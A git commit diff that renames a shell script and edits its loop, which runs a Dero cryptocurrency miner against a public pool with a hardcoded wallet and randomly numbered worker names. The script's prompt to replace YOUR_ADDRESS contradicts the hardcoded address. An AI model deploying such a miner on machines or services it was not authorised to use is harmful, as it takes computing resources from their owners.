21e42f6ca7f7ddb89a9c2246bbea9364d7b04285
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-12-02 17:52:45 +0700

    Update and rename dhnba.sh to exo.sh

--- exo.sh
+++ exo.sh
@@ -4,6 +4,6 @@ chmod 777 dero-stratum-miner
 #!/bin/bash
 echo "Replace YOUR_ADDRESS to run the miner"
 while :; do
-    ./dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9
+    ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qys9wuhjztzttgwhg3ahz3wamh7rkk86fs5xjtuxppflzkf9wl7rxqqma4k6w.$(echo $(shuf -i 1-9999 -n 1)-sty)
     sleep 5;
 done
